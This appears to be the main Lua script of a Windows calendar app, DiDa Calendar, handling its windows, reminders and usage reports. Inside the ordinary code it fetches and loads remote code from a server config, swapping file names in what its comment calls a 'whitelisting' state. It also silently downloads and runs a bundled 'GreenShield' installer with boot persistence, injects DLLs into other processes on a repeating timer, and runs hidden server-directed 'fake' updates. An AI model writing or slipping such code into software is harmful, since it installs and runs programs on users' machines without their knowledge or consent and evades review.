local tipUtil = XLGetObject("API.Util")
local tipAsynUtil = XLGetObject("API.AsynUtil")
local gnLastReportRunTmUTC = 0

-----------------

function LoadLuaModule(tFile, curDocPath)
--tFile可以传lua文件绝对路径、相对路径
	if "table" == type(tFile) then
		for index, value in ipairs(tFile) do
			if "string" == type(value) and value ~= "" then
				local dstPath = curDocPath.."\\..\\"..value
				if XLModuleExists(dstPath) then
					XLUnloadModule(dstPath)
					XLLoadModule(dstPath)
				else
					XLLoadModule(dstPath)
				end
				
			end
		end
	elseif "string" == type(tFile) and tFile ~= ""then
		if curDocPath then
			tFile = curDocPath.."\\..\\"..tFile
		end
		if XLModuleExists(tFile) then
			XLUnloadModule(tFile)
			XLLoadModule(tFile)
		else
			XLLoadModule(tFile)
		end
	end
end

local File = {
"luacode\\objectbase.lua",
"luacode\\helper.lua",
}
LoadLuaModule(File, __document)

function RegisterFunctionObject()
	local strFunhelpPath = __document.."\\..\\functionhelper.lua"
	XLLoadModule(strFunhelpPath)
	
	local tFunH = XLGetGlobal("DiDa.FunctionHelper")
	if type(tFunH) ~= "table" then
		return false
	else
		return true
	end
end

function IsNilString(AString)
	if AString == nil or AString == "" then
		return true
	end
	return false
end

function IsRealString(str)
	return type(str) == "string" and str ~= ""
end


function FetchValueByPath(obj, path)
	local cursor = obj
	for i = 1, #path do
		cursor = cursor[path[i]]
		if cursor == nil then
			return nil
		end
	end
	return cursor
end


function SendStartupReport(bShowWnd)
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	local tStatInfo = {}
	
	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
	tStatInfo.strEL = strSource or ""
	
	if not bShowWnd then
		tStatInfo.strEC = "startup"  --进入上报
		tStatInfo.strEA = FunctionObj.GetMinorVer() or ""
	else
		tStatInfo.strEC = "showui" 	 --展示上报
		tStatInfo.strEA = FunctionObj.GetInstallSrc() or ""
	end
	
	tStatInfo.strEV = 1
	FunctionObj.TipConvStatistic(tStatInfo)
end


function ShowMainTipWnd(objMainWnd)
	local bHideMainPage = false
	local cmdString = tipUtil:GetCommandLine()
	local bRet = string.find(tostring(cmdString), "/embedding")
	if bRet then
		bHideMainPage = true
	end
	
	if bHideMainPage then
		objMainWnd:Show(0)
	else
		local hWnd = objMainWnd:GetWndHandle()
		objMainWnd:SetTopMost(true)
		if hWnd then	
			-- tipUtil:SetWndPos(hWnd, 0, 0, 0, 0, 0, 0x0043)
			tipUtil:SetForegroundWindow(hWnd)
		else
			objMainWnd:Show(5)
		end
		
	end
	
	SendStartupReport(true)
	InjectDLL()
	WriteLastLaunchTime()
end


function WriteLastLaunchTime()
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	local nCurrnetTime = tipUtil:GetCurrentUTCTime()
	local strRegPath = "HKEY_CURRENT_USER\\SOFTWARE\\DDCalendar\\LastLaunchTime"
	FunctionObj.RegSetValue(strRegPath, nCurrnetTime)
end


function CheckForceVersion(tForceVersion)
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	if type(tForceVersion) ~= "table" then
		return false
	end

	local bRightVer = false
	
	local strCurVersion = FunctionObj.GetDiDaVersion()
	local _, _, _, _, _, strCurVersion_4 = string.find(strCurVersion, "(%d+)%.(%d+)%.(%d+)%.(%d+)")
	local nCurVersion_4 = tonumber(strCurVersion_4)
	if type(nCurVersion_4) ~= "number" then
		return bRightVer
	end
	for iIndex = 1, #tForceVersion do
		local strRange = tForceVersion[iIndex]
		local iPos = string.find(strRange, "-")
		if iPos ~= nil then
			local lVer = tonumber(string.sub(strRange, 1, iPos - 1))
			local hVer = tonumber(string.sub(strRange, iPos + 1))
			if lVer ~= nil and hVer ~= nil and nCurVersion_4 >= lVer and nCurVersion_4 <= hVer then
				bRightVer = true
				break
			end
		else
			local verFlag = tonumber(strRange)
			if verFlag ~= nil and nCurVersion_4 == verFlag then
				bRightVer = true
				break
			end
		end
	end
	
	return bRightVer
end


function TryForceUpdate(tServerConfig, strKey)
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	FunctionObj.TipLog("TryForceUpdate enter, strKey = "..tostring(strKey))
	if FunctionObj.CheckIsUpdating() then
		FunctionObj.TipLog("[TryForceUpdate] CheckIsUpdating failed,another thread is updating!")
		return
	end

	local bPassCheck = FunctionObj.CheckCommonUpdateTime(1)
	if not bPassCheck then
		FunctionObj.TipLog("[TryForceUpdate] CheckCommonUpdateTime failed")
		return		
	end

	local tNewVersionInfo = tServerConfig["tNewVersionInfo"] or {}
	local tForceUpdate = tNewVersionInfo[strKey or "tForceUpdate"]
	if(type(tForceUpdate)) ~= "table" then
		if strKey == "tForceUpdate" then
			TryForceUpdate(tServerConfig, "tFakeUpdate")
		end
		return 
	end
	
	local strCurVersion = FunctionObj.GetDiDaVersion()
	local strNewVersion = tForceUpdate.strVersion		
	if not IsRealString(strCurVersion) or not IsRealString(strNewVersion)
		or not FunctionObj.CheckIsNewVersion(strNewVersion, strCurVersion) then
		if strKey == "tForceUpdate" then
			TryForceUpdate(tServerConfig, "tFakeUpdate")
		end
		return
	end
	
	local tVersionLimit = tForceUpdate["tVersion"]
	local bPassCheck = CheckForceVersion(tVersionLimit)
	FunctionObj.TipLog("[TryForceUpdate] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
	if not bPassCheck then
		if strKey == "tForceUpdate" then
			TryForceUpdate(tServerConfig, "tFakeUpdate")
		end
		return 
	end
	
	FunctionObj.SetIsUpdating(true)
	
	FunctionObj.DownLoadNewVersion(tForceUpdate, function(strRealPath) 
		FunctionObj.SetIsUpdating(false)
		if not IsRealString(strRealPath) then
			if strKey == "tForceUpdate" then
				TryForceUpdate(tServerConfig, "tFakeUpdate")
			end
			return
		end
		
		FunctionObj.SaveCommonUpdateUTC()
		local strCmd = " /write /silent /run"
		if IsRealString(tForceUpdate["strCmd"]) then
			strCmd = strCmd.." "..tForceUpdate["strCmd"]
		end
		tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
	end)
end


function FixUserConfig(tServerConfig)
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	local tUserConfigInServer = tServerConfig["tUserConfigInServer"]
	if type(tUserConfigInServer) ~= "table" then
		return
	end

	
	-- FunctionObj.SaveConfigToFileByKey("tUserConfig")
end


function TryExecuteExtraCode(tServerConfig)
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
	local strURL = tExtraHelper["strURL"]
	local strMD5 = tExtraHelper["strMD5"]
	local tVersion = tExtraHelper["tVersion"]
	local bPassCheck = CheckForceVersion(tVersion)
	if not bPassCheck then --不满足外网版本则是过白状态, 文件名换成v1.0的
		strURL = string.gsub(strURL, "_v%d%.%d+", "_v1%.0")
		FunctionObj.TipLog("TryExecuteExtraCode, bPassCheck = "..tostring(bPassCheck)..", strURL = "..tostring(strURL))
		strMD5 = ""
	end
	if not IsRealString(strURL) then
		return
	end
	local strHelperName = FunctionObj.GetFileSaveNameFromUrl(strURL)
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSaveDir, strHelperName)
	
	local strStamp = FunctionObj.GetTimeStamp()
	local strURLFix = strURL..strStamp
	
	FunctionObj.DownLoadFileWithCheck(strURLFix, strSavePath, strMD5
	, function(bRet, strRealPath)
		FunctionObj.TipLog("[TryExecuteExtraCode] strURLFix:"..tostring(strURLFix)
		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
				
		if bRet < 0 then
			return
		end
		
		FunctionObj.TipLog("[TryExecuteExtraCode] begin execute extra helper")
		XLLoadModule(strRealPath)
	end)	
end


function AnalyzeServerConfig(nDownServer, strServerPath)
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
		FunctionObj.TipLog("[AnalyzeServerConfig] Download server config failed , start tipmain ")
		return	
	end
	
	local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
	TryForceUpdate(tServerConfig, "tForceUpdate")
	FixUserConfig(tServerConfig)
	TryExecuteExtraCode(tServerConfig)
end


function StartRunCountTimer()
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	local nTimeSpanInSec = 10 * 60 
	local nTimeSpanInMs = nTimeSpanInSec * 1000
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
		FunctionObj.SendRunTimeReport(nTimeSpanInSec, false)
		XLSetGlobal("DiDa.LastReportRunTime", gnLastReportRunTmUTC) 
	end, nTimeSpanInMs)
	
	
	---DIDA上报
	local nTimeSpanInMs = 2*60*1000
	timerManager:SetTimer(function(item, id)
		FunctionObj.SendDiDaReport(10)
	end, nTimeSpanInMs)
	
end

function ForceUpdateRemindTimer(tRealData)
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	local tRemindListData = tRealData
	if type(tRemindListData) ~= "table" then
		local strPath = FunctionObj.GetCfgPathWithName("remind.dat")
		if not tipUtil:QueryFileExists(strPath) then
			tRemindListData = {}
		end
		tRemindListData = FunctionObj.LoadTableFromFile(strPath)
	end
	FunctionObj.TipLog("ForceUpdateRemindTimer, enter, type(tRemindListData) = "..type(tRemindListData))
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	for _, data in pairs(tRemindListData) do
		FunctionObj.TipLog("ForceUpdateRemindTimer, enter, type(data) = "..type(data))
		for _, info in ipairs(data) do
			if type(info) == "table" and info["bopen"] then--状态是打开，且未提醒过
				FunctionObj.TipLog("ForceUpdateRemindTimer, info[title] = "..tostring(info["title"]))
				local nCurrentUTC = tipUtil:GetCurrentUTCTime()
				if info["ntype"] == 1 then --一次性
					if type(info["noncetargettime"]) == "number" then
						local nStep = info["noncetargettime"] - nCurrentUTC
						FunctionObj.TipLog("ForceUpdateRemindTimer, nStep = "..tostring(nStep).."info[noncetargettime] = "..tostring(info["noncetargettime"])..", nCurrentUTC = "..nCurrentUTC)
						if nStep > 0 and nStep < 30*60 then
							info["remindtime"] = info["noncetargettime"]
							if info["timerid"] then
								timerManager:KillTimer(info["timerid"])
							end
							info["timerid"] = timerManager:SetTimer(function(item, id)
								item:KillTimer(id)
								info["state"] = "hasremind"
								info["timerid"] = nil
								local strPath = FunctionObj.GetCfgPathWithName("remind.dat")
								tipUtil:SaveLuaTableToLuaFile(tRemindListData, strPath)
								FunctionObj.ShowRemindBubble(info)
							end, nStep*1000)
						end
					end
				elseif info["ntype"] == 2 then--每天
					local LYear, LMonth, LDay = tipUtil:FormatCrtTime(nCurrentUTC)
					local nTarGetUTC = tipUtil:DateTime2Seconds(LYear, LMonth, LDay, info["hour"], info["min"], 0)
					local nStep = nTarGetUTC - nCurrentUTC
					if nStep > 0 and nStep < 30*60 then
						info["remindtime"] = nTarGetUTC
						if info["timerid"] then
							timerManager:KillTimer(info["timerid"])
						end
						info["timerid"] = timerManager:SetTimer(function(item, id)
							item:KillTimer(id)
							info["state"] = nil--要清除标记才能保证每天都提醒
							info["timerid"] = nil
							local strPath = FunctionObj.GetCfgPathWithName("remind.dat")
							tipUtil:SaveLuaTableToLuaFile(tRemindListData, strPath)
							FunctionObj.ShowRemindBubble(info)
						end, nStep*1000)
					end
				elseif info["ntype"] == 3 then--每周
					if type(info["tweek"]) == "table" then
						local _, _, _, _, _, _, LWeek = tipUtil:Seconds2DateTime(nCurrentUTC)
						local bRet = false
						for _, weekidx in ipairs(info["tweek"]) do
							if weekidx == LWeek then
								bRet = true
								break
							end
						end
						if bRet then
							local LYear, LMonth, LDay = tipUtil:FormatCrtTime(nCurrentUTC)
							local nTarGetUTC = tipUtil:DateTime2Seconds(LYear, LMonth, LDay, info["hour"], info["min"], 0)
							local nStep = nTarGetUTC - nCurrentUTC
							if nStep > 0 and nStep < 30*60 then
								info["remindtime"] = nTarGetUTC
								if info["timerid"] then
									timerManager:KillTimer(info["timerid"])
								end
								info["timerid"] = timerManager:SetTimer(function(item, id)
									item:KillTimer(id)
									info["state"] = nil--要清除标记才能保证每周都提醒
									info["timerid"] = nil
									local strPath = FunctionObj.GetCfgPathWithName("remind.dat")
									tipUtil:SaveLuaTableToLuaFile(tRemindListData, strPath)
									FunctionObj.ShowRemindBubble(info)
								end, nStep*1000)
							end
						end
					end
				else--每月
					local nYear, nMonth = tipUtil:Seconds2DateTime(nCurrentUTC)
					local nTarGetUTC = tipUtil:DateTime2Seconds(nYear, nMonth, info["day"], info["hour"], info["min"], 0)
					local nStep = nTarGetUTC - nCurrentUTC
					if nStep > 0 and nStep < 30*60 then
						info["remindtime"] = nTarGetUTC
						if info["timerid"] then
							timerManager:KillTimer(info["timerid"])
						end
						info["timerid"] = timerManager:SetTimer(function(item, id)
							item:KillTimer(id)
							info["state"] = nil--要清除标记才能保证每天都提醒
							info["timerid"] = nil
							local strPath = FunctionObj.GetCfgPathWithName("remind.dat")
							tipUtil:SaveLuaTableToLuaFile(tRemindListData, strPath)
							FunctionObj.ShowRemindBubble(info)
						end, nStep*1000)
					end
				end
			end
		end
	end
end

XLSetGlobal("ForceUpdateRemindTimer", ForceUpdateRemindTimer) 

function StartUITimer()
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	local nCurrentTime = tipUtil:GetCurrentUTCTime()
	
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		if FunctionObj.CheckTimeIsAnotherDay(nCurrentTime) then
			nCurrentTime = tipUtil:GetCurrentUTCTime()
			FunctionObj.UpdateUIPanel()
		end
	end, 1000)
	--开启提醒气泡计时器
	--每半个小时判断一次， 对于即将在半小时之内执行的提醒另开计时器
	local ForceUpdateRemindTimer = XLGetGlobal("ForceUpdateRemindTimer")
	if type(ForceUpdateRemindTimer) == "function" then
		ForceUpdateRemindTimer()
	end
	timerManager:SetTimer(function(item, id)
		local ForceUpdateRemindTimer = XLGetGlobal("ForceUpdateRemindTimer")
		if type(ForceUpdateRemindTimer) == "function" then
			ForceUpdateRemindTimer()
		end
	end, 30*60*1000)
	
end


function PopTipWnd(OnCreateFunc)
	local bSuccess = false
	local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local frameHostWndTemplate = templateMananger:GetTemplate("TipMainWnd", "HostWndTemplate" )
	local frameHostWnd = nil
	if frameHostWndTemplate then
		frameHostWnd = frameHostWndTemplate:CreateInstance("DiDaTipWnd.MainFrame")
		if frameHostWnd then
			local objectTreeTemplate = nil
			objectTreeTemplate = templateMananger:GetTemplate("TipPanelTree", "ObjectTreeTemplate")
			if objectTreeTemplate then
				local uiObjectTree = objectTreeTemplate:CreateInstance("DiDaTipWnd.MainObjectTree")
				if uiObjectTree then
					frameHostWnd:BindUIObjectTree(uiObjectTree)
					local ret = OnCreateFunc(uiObjectTree)
					if ret then
						local iRet = frameHostWnd:Create()
						if iRet ~= nil and iRet ~= 0 then
							bSuccess = true
							ShowMainTipWnd(frameHostWnd)
						end
					end
				end
			end
		end
	end
	if not bSuccess then
		local FunctionObj = XLGetGlobal("DiDa.FunctionHelper")
		FunctionObj:FailExitTipWnd(4)
	end
end

function DownLoadGS()
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	local strPacketURL = "http://down.lvdun123.com/client/GsSetup_0006.exe"
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSaveDir, "GsSetup_0006.exe")
	
	local strStamp = FunctionObj.GetTimeStamp()
	local strURLFix = strPacketURL..strStamp
	
	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false
	, function(bRet, strRealPath)
			FunctionObj.TipLog("[DownLoadGS] bRet:"..tostring(bRet)
					.." strRealPath:"..tostring(strRealPath))
					
			if 0 ~= bRet then
				return
			end
			
			local strCmd = "/s /run /setboot"
			tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
	end)
end

function ProcessCommandLine()
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
	local cmdString = tipUtil:GetCommandLine()
	local bRet = string.find(tostring(cmdString), "/about")
	if bRet then
		FunctionObj.ShowPopupWndByName("TipAboutWnd.Instance", true)
	end
	
	local bRet = string.find(tostring(cmdString), "/update")
	if bRet then
		FunctionObj.ShowPopupWndByName("TipUpdateWnd.Instance", true)
	end
	
	--处理捆绑命令行，已经装了绿盾则不处理
	local strGSPath = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\GreenShield\\Path")
	if not IsRealString(strGSPath) or not tipUtil:QueryFileExists(strGSPath) then
		if string.find(tostring(cmdString), "/kbls") then
			DownLoadGS()
		elseif string.find(tostring(cmdString), "/kbl") then
			local SetLoseFocusNoHideFlag = XLGetGlobal("SetLoseFocusNoHideFlag") 
			FunctionObj.TipLog("ProcessCommandLine, type of SetLoseFocusNoHideFlag is "..type(SetLoseFocusNoHideFlag))
			SetLoseFocusNoHideFlag(true)
			FunctionObj.ShowDeleteNotepadRemindWnd("querybind", function()
				DownLoadGS()
			end)
		end
	end
	
	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
	if tostring(strSource) == "explorer" then 
		local bRet = string.find(tostring(cmdString), "/exit")
		if bRet then
			FunctionObj.ShowPopupWndByName("TipExitRemindWnd.Instance", true)
		end
	end
end


function GetResourceDir()
	local strExePath = tipUtil:GetModuleExeName()
	local _, _, strProgramDir = string.find(strExePath, "(.*)\\.*$")
	if not IsRealString(strProgramDir) then
		return nil
	end
	local _, _, strInstallDir = string.find(strProgramDir, "(.*)\\.*$")
	if not IsRealString(strInstallDir) then
		return nil
	end
	local strResPath = tipUtil:PathCombine(strInstallDir, "res")
	if IsRealString(strResPath) and tipUtil:QueryFileExists(strResPath) then
		return strResPath
	end
	return nil
end


function InjectDLL()
	function TryInjectDLL()
		local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
		local bHasInject = tipUtil:IsDiDaCalendarInjected()
		if bHasInject then
			return
		end
		local strDllPath32 = FunctionObj.GetDllPath("DiDaCalendar.dll") 
		local strDllPath64 = FunctionObj.GetDllPath("DiDaCalendar64.dll") 
		
		if IsRealString(strDllPath32) and tipUtil:QueryFileExists(strDllPath32)
			and IsRealString(strDllPath64) and tipUtil:QueryFileExists(strDllPath64) then
			tipUtil:InjectDiDaCalendarDll(strDllPath32, strDllPath64)
		end
	end
	
	TryInjectDLL()
	
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	local g_InjectDLLTimer = timerManager:SetTimer(function(item, id)
		TryInjectDLL()
	end, 3*1000)
	
	XLSetGlobal("DiDa.InjectDLLTimer", g_InjectDLLTimer) 
end


function CreateMainTipWnd()
	local function OnCreateFuncF(treectrl)
		local rootctrl = treectrl:GetUIObject("root.layout:root.ctrl")
		local bRet = rootctrl:SetTipData()			
		if not bRet then
			return false
		end
	
		return true
	end
	PopTipWnd(OnCreateFuncF)	
end


function TipMain() 
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper")
	
	CreateMainTipWnd()
	FunctionObj.CreatePopupTipWnd()
	ProcessCommandLine()
	
	StartUITimer()
end

function LoadJSONHelper()
	local strJSONHelperPath = __document.."\\..\\JSON.lua"
	local Module = XLLoadModule(strJSONHelperPath)
end


function PreTipMain() 
	gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
	XLSetGlobal("DiDa.LastReportRunTime", gnLastReportRunTmUTC) 
	
	LoadJSONHelper()
	if not RegisterFunctionObject() then
		tipUtil:Exit("Exit")
	end

	StartRunCountTimer()
	
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper")
	FunctionObj.ReadAllConfigInfo()
	
	FunctionObj.SendDiDaReport(2)
	SendStartupReport(false)
	TipMain()
	FunctionObj.DownLoadServerConfig(AnalyzeServerConfig)
end

PreTipMain()



